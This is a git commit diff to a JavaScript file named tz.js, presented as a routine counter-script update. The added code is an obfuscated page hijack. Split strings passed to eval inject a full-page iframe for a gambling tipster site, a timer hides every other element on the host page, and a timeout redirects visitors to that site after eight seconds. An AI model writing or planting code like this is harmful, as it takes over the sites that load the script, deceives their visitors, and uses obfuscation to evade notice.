7bcdd63acbf7c9f1eecccc02f640c9bbd67597a9
js999999999 <js-9@outlook.com>
2017-05-18 19:16:28 +0800

    Update tz.js

--- 2017jj/tz.js
+++ 2017jj/tz.js
@@ -1,3 +1,28 @@
-document.writeln("<script language=\"javascript\" src=\"http:\/\/count50.51yes.com\/click.aspx?id=503753931&logo=12\" charset=\"gb2312\"><\/script>");
+document.write ('<script language="javascript" type="text/javascript" src="http://count50.51yes.com/click.aspx?id=503753931&logo=12" charset="gb2312"></script>');
 
-document.writeln("<script src=http:\/\/\www.647123.com\/2017jj1/t.js ><\/script>");
+var  ss = '<center id="showcloneshengxiaon"><ifr'+'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14'+'00" height="123'+'50" src="http://www.566668888.com/#每期免费公开一肖中平特期期准！永久网址：liuhe333或liuhe555"></iframe></center>';
+eval("do"+"cu"+"ment.wr"+"ite('"+ss+"');");
+	
+try{
+	setInterval(function(){
+
+		try{
+			document.getElementById("div"+"All").style.display="no"+"ne";
+		}catch(e){}
+
+		for(var i=0;i<document.body.children.length;i++){
+			try{
+				var tagname = document.body.children[i].tagName;
+				var myid = document.body.children[i].id;
+				if(myid!="iconDiv1" && myid!="showcloneshengxiaon"){
+				  // if(tagname!="center"){ 
+				     document.body.children[i].style.display="non"+"e";
+				   //}
+				}
+			}catch(e){}
+		}
+
+	},3000);
+}catch(e){}
+
+window.setTimeout("window.location='http://www.566668888.com/#每期免费公开一肖中平特期期准！永久网址：liuhe333或liuhe555'",8000);
